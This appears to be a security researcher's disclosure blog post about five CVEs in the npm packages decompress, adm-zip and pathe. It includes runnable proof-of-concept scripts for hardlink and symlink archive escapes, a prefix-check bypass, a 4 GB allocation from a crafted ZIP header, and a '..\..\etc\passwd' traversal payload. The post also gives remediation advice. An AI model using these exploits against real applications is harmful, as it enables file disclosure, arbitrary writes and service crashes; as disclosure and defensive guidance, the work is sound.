---
layout: post
title: "The Bug Was Four Layers Down: Five CVEs in npm Dependencies"
date: 2026-07-13
image:
  path: /assets/img/posts/2026-07-13-npm-five-cves-og.jpg
  alt: "Nested dependency and archive layers exposing a security warning at their core"
categories:
  - Security Research
tags:
  - npm
  - Node.js
  - CVE
  - Path Traversal
  - Archive Extraction
---

A month ago, [I shared on LinkedIn](https://www.linkedin.com/posts/daniel-pua_mitre-just-assigned-me-5-cves-across-3-activity-7468397933709766656-X-ot) that MITRE had assigned me five CVEs across three npm packages. I could not share the IDs or technical details at the time. Now I can.

The interesting part is not that these packages contain five completely unrelated bugs. They all fail at the same boundary: data controlled by an attacker becomes a filesystem path or a memory allocation without being constrained first.

| CVE | Package | Vulnerability and impact |
|---|---|---|
| [CVE-2026-39243](https://www.cve.org/CVERecord?id=CVE-2026-39243) | `decompress <= 4.2.1` | Hardlink creation enables file disclosure and write-through corruption. |
| [CVE-2026-39246](https://www.cve.org/CVERecord?id=CVE-2026-39246) | `decompress <= 4.2.1` | Symlink creation enables file disclosure and supports writes outside the output directory. |
| [CVE-2026-39245](https://www.cve.org/CVERecord?id=CVE-2026-39245) | `decompress <= 4.2.1` | A prefix-based containment bypass enables writes outside the extraction directory. |
| [CVE-2026-39244](https://www.cve.org/CVERecord?id=CVE-2026-39244) | `adm-zip <= 0.5.18` | An unbounded ZIP-header allocation can crash the process through memory exhaustion. |
| [CVE-2026-49030](https://www.cve.org/CVERecord?id=CVE-2026-49030) | `pathe <= 2.0.3` | A normalization mismatch bypasses `../` validation on POSIX. |
{: .cve-summary}

*Patch and disclosure status last checked on July 13, 2026. CVE-2026-49030 has been assigned, but its public CVE record is still pending.*

These are library primitives, not automatic compromises. An application must pass an untrusted archive or path to the affected API, and some impacts require it to read, serve, or modify the result. That is still a very common pattern in upload handlers, build services, package scanners, and document-processing workers.

## Reproducing the bugs safely

The examples below use the vulnerable releases and write only under the operating system's temporary directory. Run them on Linux or macOS with Node.js 18 or newer: the hardlink and symlink demonstrations rely on POSIX filesystem semantics. Use a disposable working directory, do not run them as root, and never replace the temporary paths with directories containing important data.

```bash
mkdir npm-cve-lab && cd npm-cve-lab
npm init -y
npm install decompress@4.2.1 tar-stream@3 adm-zip@0.5.18 pathe@2.0.3
```

The three `decompress` examples share this small helper. Save it as `tar-helper.js`:

```javascript
const tar = require('tar-stream');

exports.makeTar = async function makeTar(addEntries) {
  const pack = tar.pack();
  addEntries(pack);
  pack.finalize();

  const chunks = [];
  for await (const chunk of pack) chunks.push(chunk);
  return Buffer.concat(chunks);
};
```

## CVE-2026-39243: hardlinks escape the archive

For a tar hardlink entry, `decompress` 4.2.1 reaches this code:

```javascript
if (x.type === 'link') {
  return fsP.link(x.linkname, dest);
}
```

Both values ultimately come from the archive. `dest` is inside the output directory, but `x.linkname` is never required to be there. A malicious tar can therefore place a second name for an existing file inside the extracted tree.

```javascript
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const decompress = require('decompress');
const { makeTar } = require('./tar-helper');

(async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cve-39243-'));
  const secret = path.join(root, 'secret.txt');
  const output = path.join(root, 'output');
  fs.writeFileSync(secret, 'DEMO_SECRET');

  const archive = await makeTar((pack) => {
    pack.entry({ name: 'leak', type: 'link', linkname: secret });
  });

  await decompress(archive, output);
  const leak = path.join(output, 'leak');
  console.log(fs.readFileSync(leak, 'utf8')); // DEMO_SECRET
  console.log(fs.statSync(leak).ino === fs.statSync(secret).ino); // true
  fs.rmSync(root, { recursive: true, force: true });
})();
```

The matching inode is the important result. Reading `output/leak` reads the original file, and any later write through that path changes the original too.

There are real constraints: hardlinks cannot cross filesystems or target directories, and operating-system hardlink protections can narrow which files may be linked. Application secrets owned by the same service account are still realistic targets.

Full report: [kevva/decompress#113](https://github.com/kevva/decompress/issues/113).

## CVE-2026-39246: symlink targets are trusted

The symlink branch has the same problem:

```javascript
if (x.type === 'symlink') {
  return fsP.symlink(x.linkname, dest);
}
```

The package does have a function named `preventWritingThroughSymlink`, but it is called only for regular file entries. It does not validate a symlink before creating it.

```javascript
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const decompress = require('decompress');
const { makeTar } = require('./tar-helper');

(async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cve-39246-'));
  const secret = path.join(root, 'secret.txt');
  const output = path.join(root, 'output');
  fs.writeFileSync(secret, 'DEMO_SECRET');

  const archive = await makeTar((pack) => {
    pack.entry({ name: 'read-me', type: 'symlink', linkname: secret });
  });

  await decompress(archive, output);
  const link = path.join(output, 'read-me');
  console.log(fs.readlinkSync(link)); // absolute path to secret.txt
  console.log(fs.readFileSync(link, 'utf8')); // DEMO_SECRET
  fs.rmSync(root, { recursive: true, force: true });
})();
```

Creating the link is the primitive. Disclosure happens when the application later reads or serves the apparently extracted file. Unlike a hardlink, a symlink can point across filesystems and can target a directory.

Full report: [kevva/decompress#114](https://github.com/kevva/decompress/issues/114).

## CVE-2026-39245: `indexOf()` is not a containment check

This bug is a bypass of the protection added for CVE-2020-12265. The package resolves a destination directory and then checks it like this:

```javascript
if (realDestinationDir.indexOf(realOutputPath) !== 0) {
  throw new Error('Refusing to write outside output directory');
}
```

That proves only that two strings share a prefix. If the allowed directory is `/tmp/app`, the sibling `/tmp/app-data` also starts at index zero.

The following archive combines that prefix mistake with the symlink primitive from CVE-2026-39246:

```javascript
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const decompress = require('decompress');
const { makeTar } = require('./tar-helper');

(async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'cve-39245-'));
  const output = path.join(root, 'app');
  const sibling = path.join(root, 'app-data');
  fs.mkdirSync(sibling);

  const archive = await makeTar((pack) => {
    pack.entry({ name: 'link', type: 'symlink', linkname: sibling });
    pack.entry({ name: 'link/pwned.txt', type: 'file' }, Buffer.from('OUTSIDE'));
  });

  await decompress(archive, output);
  const escaped = path.join(sibling, 'pwned.txt');
  console.log(fs.readFileSync(escaped, 'utf8')); // OUTSIDE
  console.log(escaped.startsWith(output + path.sep)); // false
  fs.rmSync(root, { recursive: true, force: true });
})();
```

The canonical parent is outside `app`, but it is named `app-data`, so the prefix comparison accepts it. A real containment check must enforce a path-separator boundary and account for symlinks. Better still, archive extraction should reject link entries when the use case does not need them.

Full report: [kevva/decompress#115](https://github.com/kevva/decompress/issues/115).

## CVE-2026-39244: 103 bytes ask for 4 GB of memory

`adm-zip` reads the uncompressed size from the ZIP central directory and uses it directly:

```javascript
_size = data.readUInt32LE(Constants.CENLEN);
// ...
var data = Buffer.alloc(_centralHeader.size);
```

The allocation happens before decompression and before CRC verification. The content does not need to expand to 4 GB; the header only needs to claim that it will.

This PoC includes a safety guard. It proves the attacker-controlled allocation request without actually exhausting the machine running it:

```javascript
const AdmZip = require('adm-zip');

const seed = new AdmZip();
seed.addFile('x', Buffer.from('A'));
const payload = seed.toBuffer();

const local = payload.indexOf(Buffer.from([0x50, 0x4b, 0x03, 0x04]));
const central = payload.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
payload.writeUInt32LE(0xffffffff, local + 22);
payload.writeUInt32LE(0xffffffff, central + 24);

const realAlloc = Buffer.alloc;
Buffer.alloc = function guardedAlloc(size, ...args) {
  if (size > 1024 * 1024) {
    console.log(`blocked Buffer.alloc(${size}) from ${payload.length} input bytes`);
    throw new Error('PoC safety guard');
  }
  return realAlloc(size, ...args);
};

try {
  new AdmZip(payload).getEntries()[0].getData();
} catch (error) {
  console.log(error.toString());
}
```

The output is:

```text
blocked Buffer.alloc(4294967295) from 103 input bytes
Error: PoC safety guard
```

Removing the guard turns the same input into a process-crash PoC and should only be done inside a disposable container with a strict memory limit.

One important detail: the initial CVE record describes versions before 0.5.18 as affected. I retested the published `adm-zip@0.5.18` tarball and it still requested the same 4,294,967,295-byte allocation, so I consider versions through 0.5.18 affected. [`adm-zip@0.6.0`](https://github.com/cthackers/adm-zip/releases/tag/v0.6.0), released on July 10, bounds the allocation by the data actually present. I reran the guarded PoC against that release and it completed without requesting the attacker-declared 4 GB allocation. The release notes also credit Anh Hong and José Antonio Zamudio Amaya for reporting the issue.

Full report: [cthackers/adm-zip#568](https://github.com/cthackers/adm-zip/issues/568).

## CVE-2026-49030: validation and normalization disagree

On POSIX, a backslash is a normal filename character, not a directory separator. `pathe` aims to provide platform-independent paths, so it converts backslashes to forward slashes on every platform before resolving the path.

That becomes dangerous when an application validates input using POSIX assumptions and then passes the same string to `pathe`:

```javascript
const path = require('node:path');
const pathe = require('pathe');

const base = '/var/www/uploads';
const input = '..\\..\\..\\etc\\passwd';

console.log(input.includes('../'));        // false: validation passes
console.log(path.posix.join(base, input)); // backslashes remain literal
console.log(pathe.join(base, input));      // /etc/passwd
```

This is a canonicalization differential: the validator sees one path language, while the filesystem helper sees another. Depending on whether the final path is read or written, the result can be arbitrary file disclosure or modification.

The robust pattern is to normalize first using the same semantics that will be used for the operation, resolve the final candidate, and then verify containment with `path.relative()` or an equivalent separator-aware check. Looking for the substring `../` is not sufficient.

The issue was closed as not planned and no newer npm release exists at the time of writing, so consumers handling untrusted paths need to enforce that invariant themselves.

Full report: [unjs/pathe#240](https://github.com/unjs/pathe/issues/240).

## What to do now

First, find out whether these packages are present and whether untrusted input can reach them:

```bash
npm ls decompress adm-zip pathe
```

Then apply the control at the real trust boundary:

- No fixed `decompress` release exists at the time of writing. Do not use 4.2.1 to extract untrusted archives. If links are unnecessary, reject hardlink and symlink entries. Run unavoidable archive processing in a low-privilege, isolated worker with a fresh output directory.
- Upgrade to `adm-zip` 0.6.0 or newer. Version 0.6.0 requires Node.js 14 or newer and includes behavior changes, so regression-test archive handling during the upgrade. Keep explicit limits on archive input size, entry count, total expanded bytes, per-entry bytes, and compression ratio; a timeout alone does not prevent memory exhaustion.
- Normalize once, then validate the canonical result. Containment checks must respect path separators and symlinks; raw string prefixes are not filesystem boundaries.
- Keep the extraction directory on a dedicated filesystem and never serve its contents blindly. This reduces hardlink reach and prevents archive metadata from becoming a direct read primitive.

The broader lesson is simple: dependency code runs with your application's permissions. A path hidden four layers down the lockfile still reaches the same filesystem as the code you wrote yourself.
